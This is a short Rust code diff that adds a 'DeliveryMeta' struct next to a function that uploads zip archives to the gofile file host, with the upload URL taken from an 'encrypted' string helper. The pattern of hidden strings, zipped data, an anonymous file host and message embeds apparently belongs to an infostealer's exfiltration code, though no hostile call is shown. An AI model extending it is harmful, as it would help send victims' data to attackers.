@@ -1,6 +1,13 @@
 use serde_json::{json, Value};
 use crate::encrypted::*;
 
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+pub struct DeliveryMeta {
+    pub zip_path: String,
+    pub zip_name: String,
+    pub embeds: Vec<Value>,
+}
+
 pub async fn upload_to_gofile(client: &reqwest::Client, zip_data: Vec<u8>, zip_name: &str) -> Option<String> {
     let upload_url = s_gofile_upload_url();
     
